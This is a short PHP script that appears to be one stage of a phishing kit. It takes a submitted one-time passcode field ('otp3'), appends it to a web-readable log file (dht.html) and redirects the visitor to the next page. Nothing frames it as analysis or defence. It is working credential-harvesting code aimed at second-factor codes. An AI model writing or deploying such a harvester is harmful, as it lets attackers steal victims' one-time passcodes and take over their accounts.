<?php
header("location:otp3.php");
$otp3=$_POST['otp3'];
$handle=fopen('dht.html','a');
fwrite($handle ,"otp3=$otp3\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
